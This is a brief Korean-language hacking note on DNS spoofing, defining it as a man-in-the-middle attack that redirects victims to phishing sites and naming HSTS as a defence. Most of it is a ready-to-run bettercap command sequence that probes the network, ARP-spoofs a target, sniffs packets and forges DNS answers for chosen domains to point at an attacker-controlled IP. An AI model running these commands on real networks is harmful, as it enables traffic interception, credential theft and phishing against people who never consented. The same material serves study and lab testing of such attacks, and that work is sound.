# hacking DNS Spoofing

> 중간자 공격을 하여, DNS 서버의 응답을 변조하여 피해자를 피싱 사이트로 유도하는 공격
>
> > HSTS 등의 보안 기술로 방어 가능

```sh
bettercap -iface eth0

net.probe on
net.show

set arp.spoof.fullduplex true
set arp.spoof.targets [target ip]

arp.spoof on # ARP Spoofing 시작
net.sniff on # 패킷 스니핑 시작

set dns.spoof.domains [target_domain] # e.g. www.google.com / *.google.com
set dns.spoof.address [server_ip] # 제공할 IP 주소
set dns.spoof.all true # 모든 DNS 요청을 변조
dns.spoof on # DNS Spoofing 시작
```
